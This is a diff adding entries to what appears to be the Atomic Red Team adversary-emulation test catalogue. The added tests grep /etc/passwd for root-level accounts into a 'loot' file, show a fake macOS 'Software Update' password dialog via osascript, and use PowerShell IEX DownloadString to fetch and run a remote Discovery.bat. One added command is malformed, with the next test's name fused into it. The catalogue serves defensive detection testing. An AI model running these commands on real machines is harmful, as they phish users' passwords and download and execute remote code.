@@ -11984,7 +11984,7 @@ discovery:
 
 '
     - name: View accounts with UID 0
-      description: 'List opened files by user
+      description: 'View accounts wtih UID 0
 
 '
       supported_platforms:
@@ -11995,6 +11995,19 @@ discovery:
           description: Path where captured results will be placed
           type: Path
           default: "~/loot.txt"
+      executor:
+        name: sh
+        command: 'grep ''x:0:'' /etc/passwd > #{output_file} - name: List opened files
+          by user
+
+'
+    - name: List opened files by user
+      description: 'List opened files by user
+
+'
+      supported_platforms:
+      - linux
+      - macos
       executor:
         name: sh
         command: 'username=$(echo $HOME | awk -F''/'' ''{print $3}'') && lsof -u $username
@@ -15170,6 +15183,21 @@ credential-access:
       - User
       identifier: T1141
     atomic_tests:
+    - name: AppleScript - Prompt User for Password
+      description: |
+        Prompt User for Password (Local Phishing)
+        Reference: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html
+      supported_platforms:
+      - macos
+      executor:
+        name: sh
+        command: 'osascript -e ''tell app "System Preferences" to activate'' -e ''tell
+          app "System Preferences" to activate'' -e ''tell app "System Preferences"
+          to display dialog "Software Update requires that you type your password
+          to apply changes." & return & return  default answer "" with icon 1 with
+          hidden answer with title "Software Update"''
+
+'
     - name: PowerShell - Prompt User for Password
       description: |
         Prompt User for Password (Local Phishing) as seen in Stitch RAT.
@@ -19554,6 +19582,19 @@ collection:
         Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.
       identifier: T1074
     atomic_tests:
+    - name: Stage data from Discovery.bat
+      description: 'Utilize powershell to download discovery.bat and save to a local
+        file
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        command: '"IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat'')"
+          > c:\windows\pi.log
+
+'
     - name: Stage data from Discovery.sh
       description: 'Utilize curl to download discovery.sh and execute a basic information
         gathering shell script
